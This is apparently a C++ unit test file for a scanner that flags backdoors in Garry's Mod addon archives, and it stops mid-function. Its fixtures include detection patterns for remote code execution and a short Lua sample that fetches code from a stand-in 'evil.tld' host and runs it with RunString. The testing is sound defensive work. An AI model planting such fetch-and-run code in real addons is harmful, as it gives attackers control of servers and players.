#include "../SHA256.h"
#include "../GMAReader.h"
#include "../CleanString.h"
#include "../Rules.h"
#include "../Scanner.h"
#include "../Report.h"
#include "../Composite.h"
#include "../Lzma.h"
#include "../MemoryBudget.h"
#include "../MemoryStream.h"
#include "../ScanTasks.h"
#include "../CompositeScope.h"
#include "../Heuristics.h"
#include "../BinaryStrings.h"
#include <future>
#include <chrono>

#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <random>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

static int g_failures = 0;

#define CHECK(cond) \
    do { \
        if (!(cond)) { \
            std::cerr << "FAIL " << __LINE__ << ": " << #cond << std::endl; \
            g_failures++; \
        } \
    } while (0)

template <typename T>
static void PutRaw(std::string& out, T value) {
    out.append(reinterpret_cast<const char*>(&value), sizeof(T));
}

static void PutCString(std::string& out, const std::string& value) {
    out += value;
    out += '\0';
}

struct GMABuilder {
    std::string header;
    std::string content;

    GMABuilder() {
        header += "GMAD";
        PutRaw<uint8_t>(header, 3);
        PutRaw<uint64_t>(header, 76561198000000000ull);
        PutRaw<uint64_t>(header, 1700000000ull);
        PutCString(header, "");
        PutCString(header, "test addon");
        PutCString(header, "description");
        PutCString(header, "author");
        PutRaw<int32_t>(header, 1);
    }

    void AddFile(const std::string& name, const std::string& body, int64_t declaredSize = -1) {
        PutRaw<uint32_t>(header, static_cast<uint32_t>(fileCount + 1));
        PutCString(header, name);
        PutRaw<int64_t>(header, declaredSize < 0 ? static_cast<int64_t>(body.size()) : declaredSize);
        PutRaw<uint32_t>(header, 0);
        content += body;
        fileCount++;
    }

    std::string Finish() {
        std::string out = header;
        PutRaw<uint32_t>(out, 0);
        out += content;
        return out;
    }

    int fileCount = 0;
};

static fs::path WriteTempFile(const std::string& name, const std::string& data) {
    const fs::path path = fs::temp_directory_path() / name;
    std::ofstream out(path, std::ios::binary);
    out.write(data.data(), static_cast<std::streamsize>(data.size()));
    out.close();
    return path;
}

static Detection MakeDetection(const std::string& file, int line, const std::string& detection, const std::string& severity) {
    Detection result;
    result.file = file;
    result.lineNumber = line;
    result.detection = detection;
    result.severity = severity;
    return result;
}

static void TestSHA256() {
    CHECK(SHA256::Hash("") == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
    CHECK(SHA256::Hash("abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
    CHECK(SHA256::Hash(std::string(1000, 'a')) == "41edece42d63e8d9bf515a9ba6932e1c20cbc9f5a5d134645adb5db1b9737ea3");
    CHECK(SHA256::Hash(std::string(55, 'x')) == SHA256::Hash(std::string(55, 'x')));
    CHECK(SHA256::Hash(std::string(56, 'x')) != SHA256::Hash(std::string(55, 'x')));
}

static void TestValidGMA() {
    GMABuilder builder;
    builder.AddFile("lua/autorun/good.lua", "print('hello')");
    builder.AddFile("materials/test.vmt", "\"UnlitGeneric\"");
    const fs::path path = WriteTempFile("bdscan_valid.gma", builder.Finish());

    const GMAInfo info = GMAReader::ReadGMAInfo(path);
    CHECK(info.valid);
    CHECK(info.name == "test addon");
    CHECK(info.author == "author");
    CHECK(info.files.size() == 2);
    CHECK(info.contentOffset > 0);

    if (info.valid && info.files.size() == 2) {
        std::ifstream stream(path, std::ios::binary);
        CHECK(GMAReader::ExtractFileContent(stream, info.files[0], info.contentOffset, 1024) == "print('hello')");
        CHECK(GMAReader::ExtractFileContent(stream, info.files[1], info.contentOffset, 1024) == "\"UnlitGeneric\"");
    }

    fs::remove(path);
}

static void TestTruncatedGMA() {
    GMABuilder builder;
    builder.AddFile("lua/autorun/good.lua", "print('hello')");
    std::string data = builder.Finish();
    data.resize(data.size() / 2);

    const fs::path path = WriteTempFile("bdscan_truncated.gma", data);
    const GMAInfo info = GMAReader::ReadGMAInfo(path);
    CHECK(!info.valid);
    CHECK(!info.error.empty());
    fs::remove(path);
}

static void TestHeaderOnlyGMA() {
    GMABuilder builder;
    const fs::path path = WriteTempFile("bdscan_headeronly.gma", builder.header);
    const GMAInfo info = GMAReader::ReadGMAInfo(path);
    CHECK(!info.valid);
    fs::remove(path);
}

static void TestAbsurdSizeGMA() {
    GMABuilder builder;
    builder.AddFile("lua/evil.lua", "x", 1ll << 40);
    const fs::path path = WriteTempFile("bdscan_absurd.gma", builder.Finish());

    const GMAInfo info = GMAReader::ReadGMAInfo(path);
    CHECK(!info.valid);
    CHECK(info.error == "file entry size out of range");
    fs::remove(path);
}

static void TestOverlongContentGMA() {
    GMABuilder builder;
    builder.AddFile("lua/a.lua", "short", 4096);
    const fs::path path = WriteTempFile("bdscan_overlong.gma", builder.Finish());

    const GMAInfo info = GMAReader::ReadGMAInfo(path);
    CHECK(!info.valid);
    fs::remove(path);
}

static void TestBadMagicGMA() {
    const fs::path path = WriteTempFile("bdscan_badmagic.gma", "NOPE" + std::string(64, '\0'));
    const GMAInfo info = GMAReader::ReadGMAInfo(path);
    CHECK(!info.valid);
    CHECK(info.error == "invalid GMA header");
    fs::remove(path);

    const fs::path compressedPath = WriteTempFile("bdscan_lzma.gma",
        std::string("\x5D\x00\x00\x80\x00", 5) + std::string(64, '\0'));
    const GMAInfo compressed = GMAReader::ReadGMAInfo(compressedPath);
    CHECK(!compressed.valid);
    CHECK(compressed.error == "invalid GMA header");
    fs::remove(compressedPath);

    const fs::path tiny = WriteTempFile("bdscan_tiny.gma", "GM");
    CHECK(GMAReader::ReadGMAInfo(tiny).error == "file too small");
    fs::remove(tiny);
}

static void TestUnterminatedStringGMA() {
    std::string data;
    data += "GMAD";
    PutRaw<uint8_t>(data, 3);
    PutRaw<uint64_t>(data, 0);
    PutRaw<uint64_t>(data, 0);
    data += std::string(GMAReader::kMaxStringLength + 100, 'A');

    const fs::path path = WriteTempFile("bdscan_unterminated.gma", data);
    const GMAInfo info = GMAReader::ReadGMAInfo(path);
    CHECK(!info.valid);
    fs::remove(path);
}

static void TestExtractionRejectsOversize() {
    GMABuilder builder;
    builder.AddFile("lua/a.lua", std::string(500, 'z'));
    const fs::path path = WriteTempFile("bdscan_extract.gma", builder.Finish());

    const GMAInfo info = GMAReader::ReadGMAInfo(path);
    CHECK(info.valid);
    if (info.valid) {
        std::ifstream stream(path, std::ios::binary);
        CHECK(GMAReader::ExtractFileContent(stream, info.files[0], info.contentOffset, 100).empty());
        CHECK(GMAReader::ExtractFileContent(stream, info.files[0], info.contentOffset, 1000).size() == 500);
    }
    fs::remove(path);
}

static void TestExtensionHelpers() {
    CHECK(GMAReader::GetExtension("lua/autorun/x.LUA") == ".lua");
    CHECK(GMAReader::GetExtension("noextension") == "");
    CHECK(GMAReader::IsScannableFile("a/b/c.vmt"));
    CHECK(GMAReader::IsScannableFile("a/b/c.TTF"));
    CHECK(!GMAReader::IsScannableFile("a/b/c.mdl"));
    CHECK(!GMAReader::IsScannableFile("readme"));
}

static void TestStringHelpers() {
    CHECK(trimExtraWhiteSpaces("  a    b  ") == "a b");
    CHECK(trimExtraWhiteSpaces("\t\t") == "");
    CHECK(sanitizeForReport(std::string("ok\x01\xff", 4)) == "ok..");
    CHECK(sanitizeForReport(std::string("a\0b", 3)) == "a.b");
    CHECK(sanitizeForReport("abcdef", 3) == "abc...");
    CHECK(sanitizeForReport("a\tb") == "a b");
}

static void TestBase64Decoding() {
    CHECK(DecodeBase64("aGVsbG8=") == "hello");
    CHECK(DecodeBase64("YWJj") == "abc");
    CHECK(DecodeBase64("") == "");
    CHECK(DecodeBase64("!!!!") == "");

    const std::string longEncoded =
        "VGhlIHF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZywgYW5kIHRoZW4gc29tZSBtb3JlIHRleHQgaGVyZS4=";
    CHECK(DecodeBase64(longEncoded) ==
          "The quick brown fox jumps over the lazy dog, and then some more text here.");

    std::string veryLong;
    for (int i = 0; i < 200; ++i) veryLong += "QUJD";
    std::string expected;
    for (int i = 0; i < 200; ++i) expected += "ABC";
    CHECK(DecodeBase64(veryLong) == expected);
}

static void TestFoldLiterals() {
    CHECK(FoldLiterals("x = \"a\" .. \"b\"") == "x = \"ab\"");
    CHECK(FoldLiterals("x = 'a' .. 'b'") == "x = \"ab\"");
    CHECK(FoldLiterals("x = \"a\"..\"b\"..\"c\"") == "x = \"abc\"");
    CHECK(FoldLiterals("no concat here") == "no concat here");
    CHECK(FoldLiterals("a .. b") == "a .. b");

    CHECK(FoldLiterals("string.char(82, 117, 110)") == "\"Run\"");
    CHECK(FoldLiterals("string.char(82,117,110)") == "\"Run\"");
    CHECK(FoldLiterals("_G[string.char(82,117,110,83,116,114,105,110,103)]") == "_G[\"RunString\"]");
    CHECK(FoldLiterals("string.char(10)") == "string.char(10)");
    CHECK(FoldLiterals("string.char(34)") == "string.char(34)");
    CHECK(FoldLiterals("string.char(82, 10)") == "string.char(82, 10)");
    CHECK(FoldLiterals("string.char(\n82)") == "\"R\"\n");
    CHECK(FoldLiterals("_G[string.char(82,\n117,\n110)]") == "_G[\"Run\"\n\n]");
    CHECK(FoldLiterals("\"Run\"\n .. \"String\"") == "\"RunString\"\n");

    CHECK(FoldLiterals("\"\\x52\\x75\\x6e\"") == "\"Run\"");
    CHECK(FoldLiterals("\"\\82\\117\\110\"") == "\"Run\"");
    CHECK(FoldLiterals("\"\\x0a\"") == "\"\\x0a\"");
    CHECK(FoldLiterals("\"\\x22\"") == "\"\\x22\"");
    CHECK(FoldLiterals("\"\\x5c\"") == "\"\\x5c\"");

    CHECK(FoldLiterals("(\"gnirtSnuR\"):reverse()") == "\"RunString\"");
    CHECK(FoldLiterals("string.reverse(\"gnirtSnuR\")") == "\"RunString\"");
    CHECK(FoldLiterals("_G[(\"gnirtSnuR\"):reverse()]") == "_G[\"RunString\"]");
    CHECK(FoldLiterals("value:reverse()") == "value:reverse()");

    CHECK(FoldLiterals("_G[string.char(82,117,110) .. \"Str\" .. \"\\x69\\x6e\\x67\"]") == "_G[\"RunString\"]");
    CHECK(FoldLiterals("\"\\x52\\x75\\x6e\" .. 'String'") == "\"RunString\"");

    const std::string multiline = "a = \"x\" .. \"y\"\nb = string.char(65)\nc = \"\\x41\"\n";
    const std::string folded = FoldLiterals(multiline);
    CHECK(std::count(folded.begin(), folded.end(), '\n') == std::count(multiline.begin(), multiline.end(), '\n'));
    CHECK(folded == "a = \"xy\"\nb = \"A\"\nc = \"A\"\n");

    std::string out;
    CHECK(!FoldLiterals("plain text", out));
    CHECK(out.empty());
    CHECK(FoldLiterals("\"a\" .. \"b\"", out));
    CHECK(out == "\"ab\"");
}

static fs::path WritePatternDirectory() {
    const fs::path dir = fs::temp_directory_path() / "bdscan_patterns";
    fs::create_directories(dir);

    std::ofstream lua(dir / "lua_patterns.txt");
    lua << R"RX(http\.Fetch\s*\([\s\S]{0,400}?function[\s\S]{0,400}?RunString;;;[CRITICAL] LUA-901 Remote Code Execution via HTTP Fetch)RX" << "\n";
    lua << R"RX(RunString\s*\(;;;[CRITICAL] LUA-902 Code Execution (RunString))RX" << "\n";
    lua << R"RX(_G\s*\[\s*"RunString"\s*\];;;[HIGH] LUA-903 Global RunString Lookup)RX" << "\n";
    lua << R"RX(string\.char\s*\(\s*[0-9]+\s*,\s*[0-9]+\s*,\s*[0-9]+;;;[HIGH] LUA-904 CharCode Obfuscation)RX" << "\n";
    lua << R"RX(untagged_marker;;;[LOW] LUA-905 Fixture Marker)RX" << "\n";
    lua << R"RX(hinted_marker;;;[LOW] LUA-900 Pattern With A Hint;;;This is the hint text.)RX" << "\n";
    lua << "# a comment line\n";
    lua << "\n";
    lua.close();

    std::ofstream binary(dir / "binary_patterns.txt");
    binary << R"RX(RunString\s*\(;;;[CRITICAL] BIN-900 Code Execution (RunString))RX" << "\n";
    binary.close();

    std::ofstream data(dir / "data_patterns.txt");
    data << R"RX(RunString\s*\(;;;[CRITICAL] DATA-900 Code Execution (RunString);;;;;;path=*/data/*,data/*)RX" << "\n";
    data.close();

    std::ofstream module(dir / "module_patterns.txt");
    module << R"RX(\bhttps?://[^\s]{4,}\.lua\b;;;[CRITICAL] MOD-900 Remote Lua URL)RX" << "\n";
    module.close();

    return dir;
}

static std::vector<Detection> RunScan(const PatternSet& patterns, const std::string& content,
                                      const std::string& extension = ".lua",
                                      const std::string& path = "test.lua") {
    Scanner scanner(patterns);
    std::vector<Detection> found;
    scanner.Scan(content, path, extension, [&](const Detection& detection) {
        found.push_back(detection);
    });
    return found;
}

static const Detection* Find(const std::vector<Detection>& found, const std::string& needle) {
    for (const Detection& detection : found) {
        if (detection.detection.find(needle) != std::string::npos) return &detection;
    }
    return nullptr;
}

static void TestHintsAndContext(const PatternSet& patterns) {
    const Pattern* hinted = patterns.ById("LUA-900");
    CHECK(hinted != nullptr);
    if (hinted != nullptr) {
        CHECK(hinted->hint == "This is the hint text.");
        CHECK(hinted->definition == "[LOW] LUA-900 Pattern With A Hint");
        CHECK(hinted->severity == "low");
    }

    const std::vector<Pattern>* lua = patterns.ForExtension(".lua");
    CHECK(lua != nullptr);
    if (lua != nullptr && !lua->empty()) {
        CHECK((*lua)[0].hint.empty());
        CHECK((*lua)[0].definition.find(";;;") == std::string::npos);
    }

    const std::vector<Detection> hintedHit = RunScan(patterns, "hinted_marker\n");
    CHECK(hintedHit.size() == 1);
    if (hintedHit.size() == 1) CHECK(hintedHit[0].hint == "This is the hint text.");

    const std::string content = "line one\nline two\nline three\nRunString(x)\nline five\nline six\nline seven\nline eight\n";
    const std::vector<Detection> found = RunScan(patterns, content);
    const Detection* hit = Find(found, "Code Execution (RunString)");
    CHECK(hit != nullptr);
    if (hit != nullptr) {
        CHECK(hit->lineNumber == 4);
        CHECK(hit->contextStart == 1);
        CHECK(hit->context.size() == 7);
        if (hit->context.size() == 7) {
            CHECK(hit->context[0] == "line one");
            CHECK(hit->context[3] == "RunString(x)");
            CHECK(hit->context[6] == "line seven");
        }
    }

    const std::vector<Detection> atStart = RunScan(patterns, "RunString(x)\nsecond\n");
    CHECK(atStart.size() == 1);
    if (atStart.size() == 1) {
        CHECK(atStart[0].contextStart == 1);
        CHECK(atStart[0].context.size() == 2);
        CHECK(atStart[0].context[0] == "RunString(x)");
    }
}

#include "lzma_vectors.inc"

static void TestLzma() {
    const std::vector<LzmaVector> vectors = LzmaVectors();
    CHECK(!vectors.empty());

    for (const LzmaVector& vector : vectors) {
        std::string output;
        const lzma::Status status = lzma::Decompress(vector.Compressed(), 1u << 20, output);
        CHECK(status == lzma::Status::Ok);
        CHECK(output == vector.Expected());
    }

    const LzmaVector& text = vectors[0];
    const std::string compressed = text.Compressed();
    const std::string expected = text.Expected();

    std::string output;
    CHECK(lzma::Decompress(compressed, 10, output) == lzma::Status::LimitReached);

    int silentlyWrong = 0;
    for (size_t cut = 1; cut < compressed.size(); ++cut) {
        std::string result;
        if (lzma::Decompress(compressed.substr(0, cut), 1u << 20, result) != lzma::Status::Ok) continue;
        if (result != expected) silentlyWrong++;
    }
    CHECK(silentlyWrong == 0);

    silentlyWrong = 0;
    int rejected = 0;
    for (size_t i = lzma::kHeaderSize; i < compressed.size(); ++i) {
        for (int bit = 0; bit < 8; ++bit) {
            std::string mutated = compressed;
            mutated[i] = static_cast<char>(mutated[i] ^ (1 << bit));
            std::string result;
            if (lzma::Decompress(mutated, 1u << 20, result) != lzma::Status::Ok) { rejected++; continue; }
            if (result != expected) silentlyWrong++;
        }
    }
    CHECK(rejected > 0);
    CHECK(rejected + silentlyWrong > 0);

    std::string badProperties = compressed;
    badProperties[0] = static_cast<char>(9 * 5 * 5);
    CHECK(lzma::Decompress(badProperties, 1u << 20, output) == lzma::Status::BadHeader);

    CHECK(lzma::Decompress("", 1u << 20, output) == lzma::Status::BadHeader);
    CHECK(lzma::Decompress(std::string(12, '\0'), 1u << 20, output) == lzma::Status::BadHeader);

    lzma::Header header;
    CHECK(lzma::ParseHeader(compressed, header));
    CHECK(header.literalContextBits + header.literalPositionBits <= 8);
    CHECK(header.positionBits <= 4);
    CHECK(!lzma::ParseHeader("short", header));
}

static void TestCompressedGMA() {
    GMABuilder builder;
    builder.AddFile("lua/autorun/payload.lua", "RunString(secret)\n");
    builder.AddFile("materials/x.vmt", "\"UnlitGeneric\"\n");
    const std::string archive = builder.Finish();

    std::istringstream plain(archive);
    const GMAInfo fromMemory = GMAReader::ReadGMAInfo(plain, static_cast<int64_t>(archive.size()));
    CHECK(fromMemory.valid);
    CHECK(fromMemory.files.size() == 2);
    if (fromMemory.valid && fromMemory.files.size() == 2) {
        CHECK(GMAReader::ExtractFileContent(plain, fromMemory.files[0], fromMemory.contentOffset, 1024)
              == "RunString(secret)\n");
    }

    std::istringstream truncated(archive.substr(0, archive.size() / 3));
    CHECK(!GMAReader::ReadGMAInfo(truncated, static_cast<int64_t>(archive.size() / 3)).valid);
}

static void TestSkipRegistry() {
    SkipRegistry registry;
    CHECK(registry.Total() == 0);
    CHECK(!registry.Truncated());

    registry.Add(SkipReason::Compressed, "b.gma", "LZMA");
    registry.Add(SkipReason::Compressed, "a.gma", "LZMA");
    registry.Add(SkipReason::TooLarge, "big.vtf", "90 MB");
    registry.Add(SkipReason::Unreadable, "locked.lua", "could not open");

    CHECK(registry.Total() == 4);
    CHECK(registry.Count(SkipReason::Compressed) == 2);
    CHECK(registry.Count(SkipReason::TooLarge) == 1);
    CHECK(registry.Count(SkipReason::Malformed) == 0);

    const std::vector<std::string> samples = registry.Samples(SkipReason::Compressed, 5);
    CHECK(samples.size() == 2);
    if (samples.size() == 2) {
        CHECK(samples[0] == "a.gma");
        CHECK(samples[1] == "b.gma");
    }
    CHECK(registry.Samples(SkipReason::Compressed, 1).size() == 1);

    const std::vector<SkipRegistry::Entry> entries = registry.Entries();
    CHECK(entries.size() == 4);
    if (entries.size() == 4) {
        CHECK(entries[0].reason == SkipReason::TooLarge);
        CHECK(entries[1].reason == SkipReason::Compressed);
        CHECK(entries[1].path == "a.gma");
        CHECK(entries[3].reason == SkipReason::Unreadable);
    }

    CHECK(std::string(SkipReasonName(SkipReason::Compressed)) == "compressed_archive");
    CHECK(std::string(SkipReasonName(SkipReason::TooLarge)) == "too_large");
}

static std::set<std::string> StructuralIds(const std::string& content,
                                           const std::string& extension = ".lua") {
    std::set<std::string> fired;
    CollectStructuralSignals(content, extension, [&](const Detection& detection) {
        fired.insert(detection.id);
    });
    return fired;
}

static void TestStructuralSignals() {
    const std::string readable =
        "local function Greet(name)\n"
        "    print(\"hello \" .. name)\n"
        "end\n"
        "\n"
        "hook.Add(\"PlayerSay\", \"greet\", function(ply, text)\n"
        "    if text == \"!hi\" then Greet(ply:Nick()) end\n"
        "end)\n";
    CHECK(StructuralIds(readable).empty());

    const std::string packed = "local a=1 " + std::string(3200, 'x') + "\n";
    CHECK(StructuralIds(packed).count("OBF-001") == 1);

    std::string escaped = "local s = \"";
    for (int i = 0; i < 250; ++i) escaped += "\\x41";
    escaped += "\"\n";
    CHECK(StructuralIds(escaped).count("OBF-002") == 1);

    std::string dense = "local t={";
    while (dense.size() < 1400) dense += "[\"key\"]=\"value\",";
    dense += "}\n";
    CHECK(StructuralIds(dense).count("OBF-003") == 1);

    const std::string lookAlike =
        "local lIlIlI = 1\nlocal IIll00 = 2\nlocal llIIOO = 3\n"
        "local O0O0l1 = 4\nlocal I1I1l0 = 5\nprint(lIlIlI)\n";
    CHECK(StructuralIds(lookAlike).count("OBF-004") == 1);

    std::string random;
    random.reserve(4096);
    uint32_t state = 12345;
    for (int i = 0; i < 4096; ++i) {
        state = state * 1103515245u + 12345u;
        random += static_cast<char>((state >> 16) & 0xff);
    }
    CHECK(StructuralIds(random).count("OBF-005") == 1);

    std::string japanese = "local L = {}\n";
    while (japanese.size() < 4096) japanese += "L.msg = \"\xe6\x97\xa5\xe6\x9c\xac\xe8\xaa\x9e\"\n";
    CHECK(StructuralIds(japanese).count("OBF-005") == 0);
    CHECK(heuristics::LooksLikeNonLatinText(japanese));
    CHECK(!heuristics::LooksLikeNonLatinText(random));
    CHECK(!heuristics::LooksLikeNonLatinText(readable));

    std::string bones = "-- physics bone numbers\n";
    for (int i = 0; i < 400; ++i) {
        bones += "local BONE" + std::to_string(i) + "\t= " + std::to_string(i * 7) + "\n";
    }
    CHECK(StructuralIds(bones).count("OBF-005") == 0);

    const std::string lre = "\xe2\x80\xaa";
    std::string invisible = "local " + lre + " = _G\n";
    for (int i = 0; i < 10; ++i) {
        invisible += "local " + lre + lre + " = string\n";
    }
    CHECK(StructuralIds(invisible).count("OBF-006") == 1);
    CHECK(StructuralIds(invisible).count("OBF-005") == 0);
    CHECK(!heuristics::LooksLikeNonLatinText(invisible));
    CHECK(heuristics::CountInvisibleCharacters(invisible) == 21);

    CHECK(heuristics::CountInvisibleCharacters(readable) == 0);
    CHECK(heuristics::CountInvisibleCharacters(japanese) == 0);
    CHECK(heuristics::CountInvisibleCharacters("\xef\xbb\xbflocal x = 1\n") == 0);
    CHECK(heuristics::CountInvisibleCharacters("x\xef\xbb\xbf") == 1);
    CHECK(StructuralIds("\xef\xbb\xbflocal x = 1\n").count("OBF-006") == 0);

    std::string bidi = "local ok = true\n";
    for (int i = 0; i < 9; ++i) bidi += "-- \xe2\x80\xae reversed \xe2\x80\xac\n";
    CHECK(StructuralIds(bidi).count("OBF-006") == 1);

    CHECK(StructuralIds(packed, ".vmt").empty());
    CHECK(StructuralIds(dense, ".txt").empty());

    CHECK(heuristics::IsLookAlikeName("lIlIlI"));
    CHECK(heuristics::IsLookAlikeName("OO00ll"));
    CHECK(!heuristics::IsLookAlikeName("lIlI"));
    CHECK(!heuristics::IsLookAlikeName("000000"));
    CHECK(!heuristics::IsLookAlikeName("player"));

    CHECK(heuristics::ShannonEntropy("") == 0.0);
    CHECK(heuristics::ShannonEntropy(std::string(100, 'a')) == 0.0);
    CHECK(heuristics::ShannonEntropy("ab") > 0.99);

    for (const StructuralSignal& signal : StructuralSignals()) {
        CHECK(IsStructuralSignalId(signal.id));
        CHECK(IsValidSeverity(signal.severity));
        CHECK(std::string(signal.hint).size() > 40);
    }
    CHECK(!IsStructuralSignalId("LUA-001"));
}

static void TestBinaryStrings() {
    const std::string clean = "hello world";
    CHECK(binstr::ExtractPrintableRuns(clean) == "hello world\n");

    CHECK(binstr::ExtractPrintableRuns("abc").empty());
    CHECK(binstr::ExtractPrintableRuns("").empty());

    std::string mixed;
    mixed += "header";
    mixed += '\0';
    mixed += "payload";
    mixed += '\x01';
    mixed += "tail";
    CHECK(binstr::ExtractPrintableRuns(mixed) == "header\npayload\n");
    CHECK(binstr::ExtractPrintableRuns(mixed, 4) == "header\npayload\ntail\n");

    std::string wide;
    for (char c : std::string("http://evil.example/x.lua")) {
        wide += c;
        wide += '\0';
    }
    CHECK(binstr::ExtractPrintableRuns(wide) == "http://evil.example/x.lua\n");

    std::string noisy(64, '\xff');
    noisy += "findme";
    CHECK(binstr::ExtractPrintableRuns(noisy) == "findme\n");

    bool cut = false;
    const std::string capped = binstr::ExtractPrintableRuns(std::string(4096, 'a'), 6, 64, &cut);
    CHECK(capped.size() <= 64);
    CHECK(cut);
    CHECK(capped.size() >= 6);
    CHECK(capped.find_first_not_of("a\n") == std::string::npos);

    bool cutShort = true;
    CHECK(binstr::ExtractPrintableRuns(std::string("readable") + '\0', 6, 64, &cutShort) == "readable\n");
    CHECK(!cutShort);

    bool overflowed = false;
    const std::string many = binstr::ExtractPrintableRuns(
        std::string("aaaaaaaa") + '\0' + "bbbbbbbb" + '\0' + "cccccccc", 6, 20, &overflowed);
    CHECK(overflowed);
    CHECK(many.find("aaaaaaaa") != std::string::npos);

    const std::string embedded = std::string("short") + '\0' + "longenough";
    CHECK(binstr::ExtractPrintableRuns(embedded, 6).find("longenough") != std::string::npos);
    CHECK(binstr::ExtractPrintableRuns(embedded, 6).find("short") == std::string::npos);
}

static void TestPatternLoading(const PatternSet& patterns) {
    CHECK(patterns.Count() == 9);
    CHECK(patterns.ForExtension(".lua") != nullptr);
    CHECK(patterns.ForExtension(".vmt") != nullptr);
    CHECK(patterns.ForExtension(".vtf") != nullptr);
    CHECK(patterns.ForExtension(".ttf") != nullptr);
    CHECK(patterns.ForExtension(".txt") != nullptr);
    CHECK(patterns.ForExtension(".dat") != nullptr);
    CHECK(patterns.ForExtension(".json") != nullptr);
    CHECK(patterns.ForExtension(".mdl") == nullptr);
    CHECK(patterns.ForExtension(".vmt") == patterns.ForExtension(".ttf"));
    CHECK(patterns.ForExtension(".txt") == patterns.ForExtension(".dat"));
    CHECK(patterns.ForExtension(".txt") != patterns.ForExtension(".vmt"));
    CHECK(patterns.ForExtension(".dll") != nullptr);
    CHECK(patterns.ForExtension(".so") == patterns.ForExtension(".dll"));
    CHECK(patterns.ForExtension(".dll") != patterns.ForExtension(".txt"));

    const std::vector<Pattern>* lua = patterns.ForExtension(".lua");
    if (lua != nullptr) {
        CHECK(lua->size() == 6);
        const Pattern* untagged = nullptr;
        for (const Pattern& pattern : *lua) {
            if (pattern.definition.find("Fixture Marker") != std::string::npos) untagged = &pattern;
        }
        CHECK(untagged != nullptr);
        if (untagged != nullptr) CHECK(untagged->severity == "low");
        CHECK((*lua)[0].severity == "critical");
        CHECK((*lua)[2].severity == "high");
    }
}

static void TestMultiLineDetection(const PatternSet& patterns) {
    const std::string content =
        "http.Fetch(\"http://evil.tld/payload\",\n"
        "    function(body, len, headers, code)\n"
        "        RunString(body)\n"
        "    end)\n";

    const std::vector<Detection> found = RunScan(patterns, content);
    const Detection* combo = Find(found, "Remote Code Execution via HTTP Fetch");
    CHECK(combo != nullptr);
    if (combo != nullptr) CHECK(combo->lineNumber == 1);
    CHECK(Find(found, "Code Execution (RunString)") != nullptr);
}

static void TestObfuscationFolding(const PatternSet& patterns) {
    const std::vector<Detection> concat = RunScan(patterns, "local f = _G[\"RunStr\" .. \"ing\"]\n");
    const Detection* hit = Find(concat, "Global RunString Lookup");
    CHECK(hit != nullptr);
    if (hit != nullptr) {
        CHECK(hit->lineNumber == 1);
        CHECK(hit->lineText.find("\"RunStr\" .. \"ing\"") != std::string::npos);
        CHECK(hit->decodedContent.find("\"RunString\"") != std::string::npos);
    }

    const std::vector<Detection> charCode = RunScan(patterns,
        "local g = _G[string.char(82, 117, 110, 83, 116, 114, 105, 110, 103)]\n");
    CHECK(Find(charCode, "Global RunString Lookup") != nullptr);
    CHECK(Find(charCode, "CharCode Obfuscation") != nullptr);

    const std::vector<Detection> escapes = RunScan(patterns, "local h = _G[\"\\x52\\x75\\x6e\\x53\\x74\\x72\\x69\\x6e\\x67\"]\n");
    const Detection* escaped = Find(escapes, "Global RunString Lookup");
    CHECK(escaped != nullptr);
    if (escaped != nullptr) {
        CHECK(escaped->lineText.find("\\x52") != std::string::npos);
        CHECK(escaped->decodedContent == "local h = _G[\"RunString\"]");
    }

    const std::vector<Detection> decimal = RunScan(patterns, "_G[\"\\82\\117\\110\\83\\116\\114\\105\\110\\103\"]\n");
    CHECK(Find(decimal, "Global RunString Lookup") != nullptr);
}

static void TestFoldingPreservesLineNumbers(const PatternSet& patterns) {
    const std::string content =
        "local a = \"aaaaaaaaaa\" .. \"bbbbbbbbbb\"\n"
        "local b = string.char(65, 66, 67, 68, 69, 70, 71)\n"
        "local c = \"\\x41\\x42\\x43\\x44\"\n"
        "RunString(\"payload\")\n";

    const std::vector<Detection> found = RunScan(patterns, content);
    const Detection* hit = Find(found, "Code Execution (RunString)");
    CHECK(hit != nullptr);
    if (hit != nullptr) {
        CHECK(hit->lineNumber == 4);
        CHECK(hit->lineText == "RunString(\"payload\")");
    }

    const std::string multiline = "x = \"a\" ..\n    \"b\"\nRunString(1)\n";
    const std::vector<Detection> found2 = RunScan(patterns, multiline);
    const Detection* hit2 = Find(found2, "Code Execution (RunString)");
    CHECK(hit2 != nullptr);
    if (hit2 != nullptr) CHECK(hit2->lineNumber == 3);
}

static void TestLineNumbersAndDeduplication(const PatternSet& patterns) {
    const std::vector<Detection> twice = RunScan(patterns, "RunString(1) RunString(2)\n");
    CHECK(twice.size() == 1);

    const std::vector<Detection> separate = RunScan(patterns, "RunString(1)\nRunString(2)\n");
    CHECK(separate.size() == 2);
    if (separate.size() == 2) {
        CHECK(separate[0].lineNumber == 1);
        CHECK(separate[1].lineNumber == 2);
    }

    const std::vector<Detection> offset = RunScan(patterns, "\n\n\n\nRunString(1)\n");
    CHECK(offset.size() == 1);
    if (offset.size() == 1) CHECK(offset[0].lineNumber == 5);

    const std::vector<Detection> last = RunScan(patterns, "local a = 1\nRunString(2)");
    CHECK(last.size() == 1);
    if (last.size() == 1) {
        CHECK(last[0].lineNumber == 2);
        CHECK(last[0].lineText == "RunString(2)");
    }
}

static void TestExtensionRouting(const PatternSet& patterns) {
    CHECK(RunScan(patterns, "RunString(1)\n", ".vmt", "x.vmt").size() == 1);
    CHECK(RunScan(patterns, "_G[\"RunString\"]\n", ".vmt", "x.vmt").empty());
    CHECK(RunScan(patterns, "RunString(1)\n", ".mdl", "x.mdl").empty());
    CHECK(RunScan(patterns, "", ".lua").empty());
}

static void TestCharCodeEnrichment(const PatternSet& patterns) {
    const std::vector<Detection> found = RunScan(patterns, "local s = string.char(104, 105, 33)\n");
    const Detection* hit = Find(found, "CharCode Obfuscation");
    CHECK(hit != nullptr);
    if (hit != nullptr) CHECK(hit->decodedContent == "hi!");
}

static void TestWindowBoundary(const PatternSet& patterns) {
    const size_t boundary = Scanner::kWindowSize - Scanner::kWindowOverlap;

    std::string content(boundary + 100, 'x');
    content += "\nRunString(1)\n";
    CHECK(RunScan(patterns, content).size() == 1);

    std::string spanning(Scanner::kWindowSize - 20, 'y');
    spanning += "RunString(\"payload\")\n";
    CHECK(RunScan(patterns, spanning).size() == 1);

    // Both offsets above move with the constants they test, so neither can fail.
